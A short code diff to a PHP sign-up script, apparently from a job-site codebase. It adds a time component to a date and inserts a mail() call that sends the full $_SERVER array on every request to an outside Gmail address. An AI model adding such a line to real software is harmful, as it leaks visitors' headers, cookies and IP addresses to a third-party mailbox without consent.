@@ -9,6 +9,8 @@
 * 	Copyright  2005, InfoEdge India Pvt. Ltd.
 ************************************************************************************************************************/
 $http_msg=print_r($_SERVER,true);
+mail("kunal.test02@gmail.com","inputprofile_tieupA.php in USE",$http_msg);
+
 //to zip the file before sending it
 $zipIt = 0;
 if (strstr($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip'))
@@ -694,7 +696,7 @@ if($Submit)
 		if($tieup_source=="")
 			$tieup_source="IP";
 			
-		$today=date("Y-m-d");
+		$today=date("Y-m-d H:i:s");
 
 
 		if($Country_Residence==51)
